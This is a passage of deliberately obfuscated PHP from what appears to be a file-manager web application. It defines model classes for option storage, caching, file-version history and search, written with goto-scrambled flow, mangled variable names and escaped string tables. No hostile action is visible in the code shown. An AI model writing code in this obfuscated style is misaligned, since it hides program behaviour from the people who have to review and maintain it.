$C¹ÅàŠØ¢, $CÇ½²çİõ—); if (!is_array($A¾Ÿ‚‚°ª ) || count($A¾Ÿ‚‚°ª ) == 0) { break; } $C±ª¬ŸÔæÀ[$Béà„„ùÖô[259]][$E¾‹¬ÆÆ][1] = $A¾Ÿ‚‚°ª ; $this->optionsValue($C±ª¬ŸÔæÀ); $bÔà‰‚­Å = parent::select($E™´ïáÔôà); if (!$bÔà‰‚­Å) { continue; } if (is_null($EŠ£ä•ñ•¦)) { $EŠ£ä•ñ•¦ = array(); } $EŠ£ä•ñ•¦ = array_merge($EŠ£ä•ñ•¦, $bÔà‰‚­Å); } goto BÚÖË¿î—; bÈîø‘˜•: } public function delete($C„…¨öªÛ = array()) { goto C‹à¦²; fŸ’±Äèãî: $FÖ×à¿‡öê = $this->findWhereField($fºˆ §ÅÇŒ); if (!$FÖ×à¿‡öê) { return parent::delete($C„…¨öªÛ); } $e½³‹øÄøğ = 0; goto AğÄ¨Œ”ì; Bå Å‹»¼ö: return $e½³‹øÄøğ; goto Bµ™Ÿ÷; C‹à¦²: $EÚ‚¾”øÈ¤ =& $_SERVER[»„]; $aÙÕ¿œİ‡Ò = self::SQL_WHERE_IN_CHUNK; $fºˆ §ÅÇŒ = $this->optionsValue(); goto fŸ’±Äèãî; AğÄ¨Œ”ì: $eôì«¼ÓŠ« = $fºˆ §ÅÇŒ[$EÚ‚¾”øÈ¤[259]][$FÖ×à¿‡öê][1]; $eôì«¼ÓŠ« = is_array($eôì«¼ÓŠ«) ? $eôì«¼ÓŠ« : array(); for ($cÏŠõâÄ = 0; $cÏŠõâÄ < count($eôì«¼ÓŠ«); $cÏŠõâÄ += $aÙÕ¿œİ‡Ò) { $CÖïÚ±ÊÔ› = array_slice($eôì«¼ÓŠ«, $cÏŠõâÄ, $aÙÕ¿œİ‡Ò); if (!is_array($CÖïÚ±ÊÔ›) || count($CÖïÚ±ÊÔ›) == 0) { break; } $fºˆ §ÅÇŒ[$EÚ‚¾”øÈ¤[259]][$FÖ×à¿‡öê][1] = $CÖïÚ±ÊÔ›; $this->optionsValue($fºˆ §ÅÇŒ); $e½³‹øÄøğ += parent::delete($C„…¨öªÛ); } goto Bå Å‹»¼ö; Bµ™Ÿ÷: } private function findWhereField($côŒ¿¶ÎÏ) { $a‚Œï‰êÈñ =& $_SERVER[»„]; $cÆ¥ñ¸â¹Ä = self::SQL_WHERE_IN_CHUNK; if (!is_array($côŒ¿¶ÎÏ) || !is_array($côŒ¿¶ÎÏ[$a‚Œï‰êÈñ[259]])) { return !1; } foreach ($côŒ¿¶ÎÏ[$a‚Œï‰êÈñ[259]] as $a¼ã¢Œ©æÔ => $CâŸ…ÔñÆ²) { if (is_array($CâŸ…ÔñÆ²) && isset($CâŸ…ÔñÆ²[0]) && is_string($CâŸ…ÔñÆ²[0]) && strtolower($CâŸ…ÔñÆ²[0]) == $a‚Œï‰êÈñ[7] && is_array($CâŸ…ÔñÆ²[1]) && count($CâŸ…ÔñÆ²[1]) > $cÆ¥ñ¸â¹Ä) { ignore_timeout(); return $a¼ã¢Œ©æÔ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\164\145\x6d\117\x70\164\151\157\x6e"; public $field = array(); public function listData($cËğšÓáÍÌ = false, $FĞíÇÁŠ’õ = "\155\x6f\144\x69\x66\171\x54\x69\155\x65", $BÙ¿àƒ‘¹¨ = false) { $Aå˜«ç¥Ï­ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$Aå˜«ç¥Ï­) { return $cËğšÓáÍÌ ? null : array(); } if (!$cËğšÓáÍÌ) { $Aå˜«ç¥Ï­ = array_filter(array_values($Aå˜«ç¥Ï­)); return array_sort_by($Aå˜«ç¥Ï­, $FĞíÇÁŠ’õ, $BÙ¿àƒ‘¹¨); } return $Aå˜«ç¥Ï­[$_SERVER[»„][360] . $cËğšÓáÍÌ]; } public function insert($Dô‰ËÀëœÀ) { goto CÃã“Ç˜‚; e¡¢İÙÃ¼: $Dô‰ËÀëœÀ[$fØµ•ºŒ[106]] = time(); Model($this->modelType)->set($fØµ•ºŒ[361], $E ¦È²¥°, $this->optionType . $fØµ•ºŒ[362]); Model($this->modelType)->set($fØµ•ºŒ[360] . $E ¦È²¥°, $Dô‰ËÀëœÀ, $this->optionType); goto CÜâæë¸ùØ; CÃã“Ç˜‚: $fØµ•ºŒ =& $_SERVER[»„]; $Dô‰ËÀëœÀ = array_field_key($Dô‰ËÀëœÀ, $this->field); $E ¦È²¥° = Model($this->modelType)->get($fØµ•ºŒ[361], $this->optionType . $fØµ•ºŒ[362]); goto E¾çÏµó„®; E¾çÏµó„®: $E ¦È²¥° = $E ¦È²¥° ? $E ¦È²¥° : 0; $Dô‰ËÀëœÀ[$fØµ•ºŒ[363]] = ++$E ¦È²¥°; $Dô‰ËÀëœÀ[$fØµ•ºŒ[183]] = time(); goto e¡¢İÙÃ¼; CÜâæë¸ùØ: return $E ¦È²¥°; goto e•ÁÕæùƒÒ; e•ÁÕæùƒÒ: } public function update($eĞÙŒ…Š´¤, $A¡µìÊ˜í¼) { goto eì»òĞ¬²Á; A¸ŸóÎ…çó: return Model($this->modelType)->set($E‹ËƒòŠÌæ[360] . $eĞÙŒ…Š´¤, $A¡µìÊ˜í¼, $this->optionType); goto F·ùòÀ“íÒ; eì»òĞ¬²Á: $E‹ËƒòŠÌæ =& $_SERVER[»„]; $A¡µìÊ˜í¼ = array_field_key($A¡µìÊ˜í¼, $this->field); $dª‘ÇÍáøÕ = $this->listData($eĞÙŒ…Š´¤); goto få‰“ğ¯±œ; få‰“ğ¯±œ: if (!$dª‘ÇÍáøÕ) { return !1; } $A¡µìÊ˜í¼ = array_merge($dª‘ÇÍáøÕ, $A¡µìÊ˜í¼); $A¡µìÊ˜í¼[$E‹ËƒòŠÌæ[106]] = time(); goto A¸ŸóÎ…çó; F·ùòÀ“íÒ: } public function remove($eÒÜñ­­Ÿœ) { return Model($this->modelType)->remove($_SERVER[»„][360] . $eÒÜñ­­Ÿœ, $this->optionType); } public function clear() { $Eáİ¨×Ø™ =& $_SERVER[»„]; Model($this->modelType)->remove($Eáİ¨×Ø™[361], $this->optionType . $Eáİ¨×Ø™[362]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($f¬ßÂÔˆËÕ, $bôÕ‰ñÍ±ï) { if (!$bôÕ‰ñÍ±ï) { return !1; } $Däê½ôâº™ = $this->listData(); $Däê½ôâº™ = array_to_keyvalue($Däê½ôâº™, $f¬ßÂÔˆËÕ); return isset($Däê½ôâº™[$bôÕ‰ñÍ±ï]) ? $Däê½ôâº™[$bôÕ‰ñÍ±ï] : !1; } public function findByName($D£¼‡Ÿöøï) { return $this->findByKey($_SERVER[»„][28], $D£¼‡Ÿöøï); } protected function resetData($cæŸÉö…İ†) { $D°‹‹ÚìÖ° =& $_SERVER[»„]; $cæŸÉö…İ† = is_array($cæŸÉö…İ†) ? $cæŸÉö…İ† : array(); $DÍæàÔÑˆ× = array(); for ($Bï“çºóÖ = 0; $Bï“çºóÖ < count($cæŸÉö…İ†); $Bï“çºóÖ++) { $DÍæàÔÑˆ×[$D°‹‹ÚìÖ°[360] . $cæŸÉö…İ†[$Bï“çºóÖ][$D°‹‹ÚìÖ°[363]]] = $cæŸÉö…İ†[$Bï“çºóÖ]; } return Model($this->modelType)->set($DÍæàÔÑˆ×, !1, $this->optionType); } private function getAutoName($DÉô‡ªÁãî) { $B„öæ¢Ø±µ = array_to_keyvalue($this->listData(), $_SERVER[»„][28]); if (!$B„öæ¢Ø±µ || !isset($B„öæ¢Ø±µ[$DÉô‡ªÁãî])) { return $DÉô‡ªÁãî; } for ($aäßÒŠá = 1; $aäßÒŠá < count($B„öæ¢Ø±µ); $aäßÒŠá++) { $Féòö¶ø = $DÉô‡ªÁãî . "\x28{$aäßÒŠá}\x29"; if (!isset($B„öæ¢Ø±µ[$Féòö¶ø])) { return $Féòö¶ø; } } return $Féòö¶ø; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($b’ĞÏî¹ = false, $BóÆ¶Ğ¶¥ = '', $FŸïöÌ¥÷Ö = false) { goto eÍ¸¬å‹…; eÍ¸¬å‹…: $C†…Çå©¢Û =& $_SERVER[»„]; $c‡ŠåÜÆ¯ = $this->cacheGet($BóÆ¶Ğ¶¥); $D¡íìÚÊ÷ = $this->optionDefault($BóÆ¶Ğ¶¥); goto f¥¶òáÀ¨«; f–åâÑ§¼: $c‡ŠåÜÆ¯ = $this->where($eÔ…çŸ«…Æ)->select(); $c‡ŠåÜÆ¯ = array_to_keyvalue($c‡ŠåÜÆ¯, $C†…Çå©¢Û[89], $C†…Çå©¢Û[355]); foreach ($c‡ŠåÜÆ¯ as $E¨ßÙŞßó => $b‰ÉÚ‹¥‰µ) { if ($FŸïöÌ¥÷Ö || in_array($E¨ßÙŞßó, $this->jsonField)) { $c‡ŠåÜÆ¯[$E¨ßÙŞßó] = json_decode($b‰ÉÚ‹¥‰µ, !0); } } goto D˜è¥©˜Ö; f¥¶òáÀ¨«: $D¡íìÚÊ÷ = is_array($D¡íìÚÊ÷) ? $D¡íìÚÊ÷ : array(); if (is_array($c‡ŠåÜÆ¯)) { $c‡ŠåÜÆ¯ = array_merge($D¡íìÚÊ÷, $c‡ŠåÜÆ¯); return $b’ĞÏî¹ ? isset($c‡ŠåÜÆ¯[$b’ĞÏî¹]) ? $c‡ŠåÜÆ¯[$b’ĞÏî¹] : null : $c‡ŠåÜÆ¯; } $eÔ…çŸ«…Æ = $this->filterWhere(array($C†…Çå©¢Û[29] => $BóÆ¶Ğ¶¥)); goto f–åâÑ§¼; D˜è¥©˜Ö: $this->cacheSet($BóÆ¶Ğ¶¥, $c‡ŠåÜÆ¯); $c‡ŠåÜÆ¯ = array_merge($D¡íìÚÊ÷, $c‡ŠåÜÆ¯); return $b’ĞÏî¹ ? $c‡ŠåÜÆ¯[$b’ĞÏî¹] : $c‡ŠåÜÆ¯; goto Eä»Êôç¯¬; Eä»Êôç¯¬: } public function set($fÎ‚·¹Âëâ, $FÂÊŠã‚îÆ = false, $dİ‡ÏßÑ±² = '') { goto aØø¼†Öİ¨; aØø¼†Öİ¨: $A‚ĞÑˆ–£ö =& $_SERVER[»„]; $this->cacheRemove($dİ‡ÏßÑ±²); $cœ½¡«ìµÖ = array(); goto Dô©ƒÔÅ¬; c„ãõÒ»¶±: return $this->addAll($cœ½¡«ìµÖ, array(), !0); goto EÏ»°™±‘¦; Dô©ƒÔÅ¬: $A§°¶¡±„Ù = is_array($fÎ‚·¹Âëâ) ? $fÎ‚·¹Âëâ : array($fÎ‚·¹Âëâ => $FÂÊŠã‚îÆ); foreach ($A§°¶¡±„Ù as $c»ôùê‡Íİ => $fíŞô Ô) { if (is_array($fíŞô Ô)) { $fíŞô Ô = json_encode_force($fíŞô Ô); } $this->checkLength($fíŞô Ô, !1, $this->tableName . $A‚ĞÑˆ–£ö[4] . $fÎ‚·¹Âëâ); $fíŞô Ô = self::textEncode($fíŞô Ô); $A§°¶¡±„Ù = array($A‚ĞÑˆ–£ö[29] => $dİ‡ÏßÑ±², $A‚ĞÑˆ–£ö[89] => $c»ôùê‡Íİ, $A‚ĞÑˆ–£ö[355] => $fíŞô Ô); $cœ½¡«ìµÖ[] = $this->filterWhere($A§°¶¡±„Ù); } if (!$cœ½¡«ìµÖ) { return !0; } goto c„ãõÒ»¶±; EÏ»°™±‘¦: } protected function optionDefault($c•ÁãÔé»¬ = '') { return !1; } public function setDeep($cÂòŞãË, $eõ¯ÃÑíÙ = false, $BË×¾ÊŒô£ = '') { $fÀòËÁß½ë = explode($_SERVER[»„][91], $cÂòŞãË); $fÃ†ŒÌ‹æÓ = $this->get(); array_set_value($fÃ†ŒÌ‹æÓ, $cÂòŞãË, $eõ¯ÃÑíÙ); $this->set($fÀòËÁß½ë[0], $fÃ†ŒÌ‹æÓ[$fÀòËÁß½ë[0]], $BË×¾ÊŒô£); } public function remove($D¦ïŒß°ò, $C¬÷ÉİË†å = '') { $c¹×„ô„ä =& $_SERVER[»„]; $this->cacheRemove($C¬÷ÉİË†å); $AˆÜâñ­¤ø = $this->filterWhere(array($c¹×„ô„ä[89] => $D¦ïŒß°ò, $c¹×„ô„ä[29] => $C¬÷ÉİË†å)); if (is_null($D¦ïŒß°ò)) { unset($AˆÜâñ­¤ø[$c¹×„ô„ä[89]]); } return $this->where($AˆÜâñ­¤ø)->delete(); } public function cacheSet($c„µôÍŠ¡, $Fˆ‚ç†ğì§ = false) { return Cache::set($this->cacheKey($c„µôÍŠ¡), $Fˆ‚ç†ğì§); } public function cacheGet($bô±ù…šö») { return Cache::get($this->cacheKey($bô±ù…šö»)); } public function cacheRemove($d«ª‚ëò¦¹) { return Cache::remove($this->cacheKey($d«ª‚ëò¦¹)); } protected function filterWhere($e‘ŸÄ«ˆÌ“) { return $e‘ŸÄ«ˆÌ“; } protected function cacheKey($b‘œ’ƒÁ¹±) { return $b‘œ’ƒÁ¹±; } } goto B’Û±Ì›È; Fğ¤—‚Ã‡‹: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\165\162\x63\145\137\x68\151\x73\x74\x6f\x72\171"; public function addHistory($fâõ¤†áİí, $CäÔôàƒ² = '') { $cæ’ÌŞ‘ª =& $_SERVER[»„]; $b“íÛˆÂ‡ = array($cæ’ÌŞ‘ª[379] => $fâõ¤†áİí[$cæ’ÌŞ‘ª[365]], $cæ’ÌŞ‘ª[1400] => isset($fâõ¤†áİí[$cæ’ÌŞ‘ª[375]]) ? $fâõ¤†áİí[$cæ’ÌŞ‘ª[375]] : $fâõ¤†áİí[$cæ’ÌŞ‘ª[374]], $cæ’ÌŞ‘ª[416] => $fâõ¤†áİí[$cæ’ÌŞ‘ª[415]], $cæ’ÌŞ‘ª[516] => $fâõ¤†áİí[$cæ’ÌŞ‘ª[77]], $cæ’ÌŞ‘ª[2265] => $CäÔôàƒ²); $AßŠ¡æõ…Ì = $GLOBALS[$cæ’ÌŞ‘ª[6]][$cæ’ÌŞ‘ª[84]][$cæ’ÌŞ‘ª[2266]]; if ($AßŠ¡æõ…Ì > 1) { $this->historyAutoClear($b“íÛˆÂ‡[$cæ’ÌŞ‘ª[365]]); $this->add($b“íÛˆÂ‡); } Model($cæ’ÌŞ‘ª[2267])->eventFileEdit($fâõ¤†áİí[$cæ’ÌŞ‘ª[365]]); } private function historyAutoClear($Bµœ†”’¨Õ) { goto añ¡ß«‡”Ã; añ¡ß«‡”Ã: $E³‡Ô¸‰Î¨ =& $_SERVER[»„]; $d¹ˆÄõ²  = Model($E³‡Ô¸‰Î¨[1076])->get($E³‡Ô¸‰Î¨[2268]); $Aô¤ÏÅê£ = $GLOBALS[$E³‡Ô¸‰Î¨[6]][$E³‡Ô¸‰Î¨[84]][$E³‡Ô¸‰Î¨[2266]]; goto båÓá‚¡¯; fƒºôğ’‰‡: $AìÊØ¹éŞé = array($E³‡Ô¸‰Î¨[381] => array($E³‡Ô¸‰Î¨[7], $FêÂÑª†÷)); $this->where($AìÊØ¹éŞé)->delete(); Model($E³‡Ô¸‰Î¨[418])->remove($c³£ÙÙ…³ƒ); goto bÑòóÅ“©™; båÓá‚¡¯: $EŞÙËÊå‘„ = $d¹ˆÄõ²  == $E³‡Ô¸‰Î¨[2269] ? 3 : $Aô¤ÏÅê£; if ($Aô¤ÏÅê£ <= 1) { $EŞÙËÊå‘„ = 1; } $aÂ¥¸Œãîˆ = $EŞÙËÊå‘„ - 1; goto bÌáêùĞ¬; F¸ÓÓ„Ğ„¬: $c³£ÙÙ…³ƒ = array_to_keyvalue($AÃÇ÷¶†äÜ, $E³‡Ô¸‰Î¨[33], $E³‡Ô¸‰Î¨[415]); $c³£ÙÙ…³ƒ = array_slice($c³£ÙÙ…³ƒ, $aÂ¥¸Œãîˆ); if (!$FêÂÑª†÷ || !$c³£ÙÙ…³ƒ) { return; } goto fƒºôğ’‰‡; c±ö©¨Œé†: if (!$AÃÇ÷¶†äÜ || $aÂ¥¸Œãîˆ >= count($AÃÇ÷¶†äÜ)) { return; } $FêÂÑª†÷ = array_to_keyvalue($AÃÇ÷¶†äÜ, $E³‡Ô¸‰Î¨[33], $E³‡Ô¸‰Î¨[363]); $FêÂÑª†÷ = array_slice($FêÂÑª†÷, $aÂ¥¸Œãîˆ); goto F¸ÓÓ„Ğ„¬; bÌáêùĞ¬: if ($aÂ¥¸Œãîˆ >= 500) { return; } $AìÊØ¹éŞé = array($E³‡Ô¸‰Î¨[379] => $Bµœ†”’¨Õ); $AÃÇ÷¶†äÜ = $this->field($E³‡Ô¸‰Î¨[2270])->where($AìÊØ¹éŞé)->order($E³‡Ô¸‰Î¨[2262])->select(); goto c±ö©¨Œé†; bÑòóÅ“©™: } public function listData($B×ĞÖö‹ëÄ) { goto bÂŒµ³§ß; eƒí´ö¨: $A£¥–ê”ç¥ = $this->field($B£Ÿç‘óÄ¦)->where($e“õ›ƒ)->order($b²¥‡‡™§‡[2262])->selectPage(); $this->_listAppendUser($A£¥–ê”ç¥[$b²¥‡‡™§‡[350]]); $b…ø±£éÇ = Model($b²¥‡‡™§‡[1076])->get($b²¥‡‡™§‡[2268]); goto bœéïğÀ; bÂŒµ³§ß: $b²¥‡‡™§‡ =& $_SERVER[»„]; $e“õ›ƒ = array($b²¥‡‡™§‡[379] => $B×ĞÖö‹ëÄ); $B£Ÿç‘óÄ¦ = $b²¥‡‡™§‡[2271]; goto eƒí´ö¨; bœéïğÀ: $AêëÑ—¯ÈĞ = 3; if ($b…ø±£éÇ == $b²¥‡‡™§‡[2269]) { $A£¥–ê”ç¥[$b²¥‡‡™§‡[350]] = array_slice($A£¥–ê”ç¥[$b²¥‡‡™§‡[350]], 0, $AêëÑ—¯ÈĞ); $A£¥–ê”ç¥[$b²¥‡‡™§‡[347]] = array($b²¥‡‡™§‡[2272] => 1, $b²¥‡‡™§‡[2273] => 20, $b²¥‡‡™§‡[2274] => 1, $b²¥‡‡™§‡[2275] => count($A£¥–ê”ç¥[$b²¥‡‡™§‡[350]])); } return $A£¥–ê”ç¥; goto e¼ôÄ®ó•; e¼ôÄ®ó•: } protected function _listAppendUser(&$bÕòŸñ˜¿) { $C•¥œÕµöã =& $_SERVER[»„]; $a´×™à‘á = array_to_keyvalue($bÕòŸñ˜¿, $C•¥œÕµöã[33], $C•¥œÕµöã[1409]); $E—…Åã  = Model($C•¥œÕµöã[473])->userListInfo($a´×™à‘á); foreach ($bÕòŸñ˜¿ as &$fÒÔÎÆé’) { $e¸ŠÁë·ï¤ = $fÒÔÎÆé’[$C•¥œÕµöã[1409]]; $fÒÔÎÆé’[$C•¥œÕµöã[374]] = $E—…Åã [$e¸ŠÁë·ï¤] ? $E—…Åã [$e¸ŠÁë·ï¤] : !1; } } public function fileInfo($bÜŒƒÍ—¯†) { $EŒãù¶¥Ğ± =& $_SERVER[»„]; $eñ«ì°µ‘ = $this->tablePrefix; $cÆËÄÖÃª = "{$eñ«ì°µ‘}\x69\157\x5f\x66\151\x6c\145\x20\x66\x69\154\x65\163\x20\x6f\x6e\x20\146\x69\154\x65\163\56\146\x69\x6c\x65\x49\x44\x20\x3d\x20\x68\x69\163\164\157\162\x79\56\146\x69\x6c\x65\x49\x44"; return $this->alias($EŒãù¶¥Ğ±[2276])->where(array($EŒãù¶¥Ğ±[381] => $bÜŒƒÍ—¯†))->join($cÆËÄÖÃª, $EŒãù¶¥Ğ±[2277])->find(); } public function removeItem($e‰ÙÑŸ ¾õ) { $d©Äßâ¼Ï´ =& $_SERVER[»„]; $aÎÛ¿ùÊø = array($d©Äßâ¼Ï´[381] => $e‰ÙÑŸ ¾õ); $b¦¿‘…ª = $this->where($aÎÛ¿ùÊø)->find(); if ($b¦¿‘…ª) { $FÈõ§ßºò® = $this->where($aÎÛ¿ùÊø)->delete(); Model($d©Äßâ¼Ï´[418])->remove($b¦¿‘…ª[$d©Äßâ¼Ï´[415]]); return $FÈõ§ßºò®; } return !1; } public function removeBySource($eÆ¶âÍ‘É) { goto Bçòá†ôƒß; bï¦œ½’¶: return !0; goto DœÔ¶†ˆ; Bçòá†ôƒß: $eÃùÌßÌŒ =& $_SERVER[»„]; if (!$eÆ¶âÍ‘É) { return !1; } if (!is_array($eÆ¶âÍ‘É)) { $eÆ¶âÍ‘É = array($eÆ¶âÍ‘É); } goto aÙìæÌÁä ; aÙìæÌÁä : $cô£ÂÏ¿æ‹ = array($eÃùÌßÌŒ[379] => array($eÃùÌßÌŒ[7], $eÆ¶âÍ‘É)); $AÆÎÎ•ß®ì = $this->field($eÃùÌßÌŒ[416])->where($cô£ÂÏ¿æ‹)->select(); if ($AÆÎÎ•ß®ì) { $this->where($cô£ÂÏ¿æ‹)->delete(); $e‰ˆÎŞ˜Œ = array_to_keyvalue($AÆÎÎ•ß®ì, $eÃùÌßÌŒ[33], $eÃùÌßÌŒ[415]); Model($eÃùÌßÌŒ[418])->remove($e‰ˆÎŞ˜Œ); } goto bï¦œ½’¶; DœÔ¶†ˆ: } public function setDetail($C¥Ä“Æ£¢Ó, $fÊÒó™ÙÁ) { $EøøãÂ²®­ =& $_SERVER[»„]; return $this->where(array($EøøãÂ²®­[381] => $C¥Ä“Æ£¢Ó))->save(array($EøøãÂ²®­[2265] => $fÊÒó™ÙÁ)); } public function rollbackToItem($aÓÓ˜ª“‚, $e°²ôßÙÛ±) { goto f¼Ò·‡éôí; C¯áÛÁ¹ƒ´: return $this->where(array($f˜²¤ˆŞ¾Œ[381] => $e°²ôßÙÛ±))->delete(); goto a‰½Û¢òÉ»; f¼Ò·‡éôí: $f˜²¤ˆŞ¾Œ =& $_SERVER[»„]; $b‹„™§Í¼™ = Model($f˜²¤ˆŞ¾Œ[740])->sourceInfo($aÓÓ˜ª“‚); $this->addHistory($b‹„™§Í¼™); goto cŠ™÷‰Çï†; cŠ™÷‰Çï†: $f×í¸â˜‚… = $this->find($e°²ôßÙÛ±); $c–ŸŒ‘…ÑŒ = array($f˜²¤ˆŞ¾Œ[415] => $f×í¸â˜‚…[$f˜²¤ˆŞ¾Œ[415]], $f˜²¤ˆŞ¾Œ[77] => $f×í¸â˜‚…[$f˜²¤ˆŞ¾Œ[77]], $f˜²¤ˆŞ¾Œ[106] => time(), $f˜²¤ˆŞ¾Œ[375] => USER_ID); Model($f˜²¤ˆŞ¾Œ[740])->where(array($f˜²¤ˆŞ¾Œ[365] => $aÓÓ˜ª“‚))->save($c–ŸŒ‘…ÑŒ); goto C¯áÛÁ¹ƒ´; a‰½Û¢òÉ»: } public function clearSame($f¹ÉîŞ¶ì) { goto cÄğ‡¸ˆÈÎ; cÄğ‡¸ˆÈÎ: $déŒ†êØÈâ =& $_SERVER[»„]; $DÄÚÅ­ô¼À = $this->listData($f¹ÉîŞ¶ì); $F§ªÈ•ê¾» = array_to_keyvalue_group($DÄÚÅ­ô¼À, $déŒ†êØÈâ[415]); goto D–»ÔÕÑ¬„; b×Ì–È¿°: if (!$b–¥Äî£—) { return; } $this->where(array($déŒ†êØÈâ[363] => array($déŒ†êØÈâ[7], $b–¥Äî£—)))->delete(); Model($déŒ†êØÈâ[418])->remove($dĞ³ß”²ç); goto C™ˆ”³Ò½Õ; D–»ÔÕÑ¬„: $dĞ³ß”²ç = array(); $b–¥Äî£— = array(); foreach ($F§ªÈ•ê¾» as $d¶ğ£Š™˜Ø) { if (!$d¶ğ£Š™˜Ø || count($d¶ğ£Š™˜Ø) <= 1) { continue; } foreach ($d¶ğ£Š™˜Ø as $b®­÷ÖÏˆ•) { $dĞ³ß”²ç[] = $b®­÷ÖÏˆ•[$déŒ†êØÈâ[415]]; $b–¥Äî£—[] = $b®­÷ÖÏˆ•[$déŒ†êØÈâ[363]]; } } goto b×Ì–È¿°; C™ˆ”³Ò½Õ: } public function userSpace() { $c¥ñÚ©–Â¦ =& $_SERVER[»„]; $e²‰Ùàë = $this->tablePrefix; $bĞª§‚†Ù = array($c¥ñÚ©–Â¦[1400] => USER_ID); $cµŒŠéù¦ = "{$e²‰Ùàë}\x69\157\x5f\x66\151\x6c\x65\x20\x66\151\154\x65\163\x20\x6f\156\40\x66\x69\154\x65\163\x2e\146\151\154\x65\x49\x44\40\x3d\40\150\151\x73\x74\x6f\x72\171\x2e\146\x69\154\x65\111\x44"; return $this->alias($c¥ñÚ©–Â¦[2276])->where($bĞª§‚†Ù)->join($cµŒŠéù¦, $c¥ñÚ©–Â¦[2277])->sum($c¥ñÚ©–Â¦[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Döİ§™Óñö) { goto aĞÉ¨Éœ•; aĞÉ¨Éœ•: $CªÌŠ¹¸ =& $_SERVER[»„]; $Då«ŒÊÎÚ = KodIO::fileTypeList(); $c²‘²æŞ½¸ = $Då«ŒÊÎÚ[$Döİ§™Óñö]; goto C³µ¹ŠÒ»‹; C³µ¹ŠÒ»‹: if (!$c²‘²æŞ½¸) { return array(); } $FæÈù¸‰‹± = $c²‘²æŞ½¸[$CªÌŠ¹¸[156]]; $Bµ±¥ÇŒÏ = $CªÌŠ¹¸[7]; goto fÁßõæ¨¨Û; fÁßõæ¨¨Û: if (!$c²‘²æŞ½¸[$CªÌŠ¹¸[156]]) { $a—ÚÄÑ§¸× = array_to_keyvalue($Då«ŒÊÎÚ, $CªÌŠ¹¸[33], $CªÌŠ¹¸[156]); $FæÈù¸‰‹± = implode($CªÌŠ¹¸[47], $a—ÚÄÑ§¸×); $Bµ±¥ÇŒÏ = $CªÌŠ¹¸[2228]; } $Eêì¦îŠÌ = explode($CªÌŠ¹¸[47], trim($FæÈù¸‰‹±, $CªÌŠ¹¸[47])); return array($Bµ±¥ÇŒÏ, $Eêì¦îŠÌ); goto d¸ŞÌĞ“›½; d¸ŞÌĞ“›½: } public function listPathType($dË‘ùŠ‡¾›) { $Aè¿–Œî¼ =& $_SERVER[»„]; $eğ¬¤âçŠ = $this->fileTypeWhere($dË‘ùŠ‡¾›); if (!$eğ¬¤âçŠ) { return array(); } $DæÈù•Î = array($Aè¿–Œî¼[517] => SourceModel::TYPE_USER, $Aè¿–Œî¼[518] => USER_ID, $Aè¿–Œî¼[514] => 0, $Aè¿–Œî¼[515] => $eğ¬¤âçŠ); return $this->listSource($DæÈù•Î); } public function listSearch($C…‹ ˆòš†, $cØ¾†Ã¤ÑÊ = 300) { goto e¢¼ÀÖÒ†; e¢¼ÀÖÒ†: $FÄÏñ¥ Š =& $_SERVER[»„]; if (isset($C…‹ ˆòš†[$FÄÏñ¥ Š[2148]]) && $C…‹ ˆòš†[$FÄÏñ¥ Š[2148]]) { $C…‹ ˆòš†[$FÄÏñ¥ Š[2148]] = str_replace($FÄÏñ¥ Š[1561], $FÄÏñ¥ Š[2278], trim($C…‹ ˆòš†[$FÄÏñ¥ Š[2148]])); } $D£ƒŒéÌÛ  = $this->_parseSearchWhere($C…‹ ˆòš†); goto B‘‰´µ®÷À; eî‚‰­µ¾Ÿ: $this->_listSearchDesc($CšÀø®ƒ¢Š, $C…‹ ˆòš†, $b…²ÍïÁÃù); $this->_listSearchTag($CšÀø®ƒ¢Š, $C…‹ ˆòš†, $b…²ÍïÁÃù); $this->_listDataApply($CšÀø®ƒ¢Š[$FÄÏñ¥ Š[350]]); goto C©˜®Ö¤Ş; aÉö“¥çµ…: $this->_listSearchBindPinyin($C…‹ ˆòš†, $D£ƒŒéÌÛ , $b„÷ó§’šÌ); $this->alias($FÄÏñ¥ Š[483])->_makeOrder()->cache(null, 10); $CšÀø®ƒ¢Š = $this->distinct(!0)->field($b„÷ó§’šÌ)->where($D£ƒŒéÌÛ )->selectPage($cØ¾†Ã¤ÑÊ); goto eî‚‰­µ¾Ÿ; C©˜®Ö¤Ş: $this->_listMake($CšÀø®ƒ¢Š); return $CšÀø®ƒ¢Š; goto b”«·­º»; B‘‰´µ®÷À: if (!isset($D£ƒŒéÌÛ [$FÄÏñ¥ Š[393]])) { $D£ƒŒéÌÛ [$FÄÏñ¥ Š[393]] = 0; } $b„÷ó§’šÌ = $FÄÏñ¥ Š[2279]; $b…²ÍïÁÃù = $b„÷ó§’šÌ; goto aÉö“¥çµ…; b”«·­º»: } private function _listSearchTag(&$aôµŒˆÉ¸ù, $b¬¸–¾ˆ, $B¿…“²‡„Ö) { goto BÃ¸™õÆÇ; B²ê‰†ãˆ: $BÉ“¡ùËî´ = array(); $F¤¬ºë ´‹ = $b¬¸–¾ˆ[$C¿Çó¶ÓÃß[2148]]; foreach ($BŠç»Œ – as $DèÍÁ¨´ãğ) { $DŸ™‘¿´ÏÔ = $DèÍÁ¨´ãğ[$C¿Çó¶ÓÃß[28]]; $a‘ëÆåÄñë = str_replace($C¿Çó¶ÓÃß[50], $C¿Çó¶ÓÃß[33], Pinyin::encode($DŸ™‘¿´ÏÔ)); if (stripos($DŸ™‘¿´ÏÔ, $F¤¬ºë ´‹) !== !1 || stripos($a‘ëÆåÄñë, $F¤¬ºë ´‹) !== !1) { $BÉ“¡ùËî´[] = $DèÍÁ¨´ãğ[$C¿Çó¶ÓÃß[363]]; } } goto D¤Û£ÛÄøƒ; D¤Û£ÛÄøƒ: if (!$BÉ“¡ùËî´) { return; } $A•„‚š–• = array($C¿Çó¶ÓÃß[389] => array($C¿Çó¶ÓÃß[7], $BÉ“¡ùËî´)); $C¢ÍŞµ¹Ü = Model($C¿Çó¶ÓÃß[390])->field($C¿Çó¶ÓÃß[75])->where($A•„‚š–•)->select(); goto B±ŠÙ‚…¿‰; B±ŠÙ‚…¿‰: $C¢ÍŞµ¹Ü = array_to_keyvalue($C¢ÍŞµ¹Ü, 